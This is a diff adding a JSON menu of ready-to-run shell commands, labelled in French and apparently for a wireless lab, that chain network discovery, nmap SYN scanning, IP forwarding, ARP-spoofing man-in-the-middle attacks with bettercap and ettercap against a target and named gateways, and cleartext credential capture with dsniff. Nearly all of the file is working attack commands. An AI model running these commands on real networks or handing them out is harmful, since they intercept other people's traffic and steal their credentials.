@@ -1,0 +1,11 @@
+[
+  { "label": "LAB - hotes (arp-scan wlan0)", "cmd": "arp-scan --interface=wlan0 --localnet", "needsTarget": false },
+  { "label": "LAB - ports {T}", "cmd": "nmap -sS -T4 -Pn {T}", "needsTarget": true },
+  { "label": "LAB - phy monitor-capable ?", "cmd": "iw phy | grep -A8 'Supported interface modes'", "needsTarget": false },
+  { "label": "MITM - ip_forward ON", "cmd": "sysctl -w net.ipv4.ip_forward=1", "needsTarget": false },
+  { "label": "MITM - bettercap {T} (GW .253)", "cmd": "bettercap -iface wlan0 -eval \"set arp.spoof.targets {T}; set arp.spoof.internal true; set net.sniff.verbose false; arp.spoof on; net.sniff on\"", "needsTarget": true },
+  { "label": "MITM - ettercap {T} vs GW .253", "cmd": "ettercap -T -q -i wlan0 -M arp:remote /{T}// /10.10.10.253//", "needsTarget": true },
+  { "label": "MITM - ettercap {T} vs box .11.1", "cmd": "ettercap -T -q -i wlan0 -M arp:remote /{T}// /192.168.11.1//", "needsTarget": true },
+  { "label": "MITM - creds clair (dsniff)", "cmd": "dsniff -i wlan0 -m", "needsTarget": false },
+  { "label": "MITM - STOP + restaure ARP", "cmd": "pkill -f bettercap; pkill -f ettercap; pkill -f dsniff; sysctl -w net.ipv4.ip_forward=0; echo restaure", "needsTarget": false }
+]
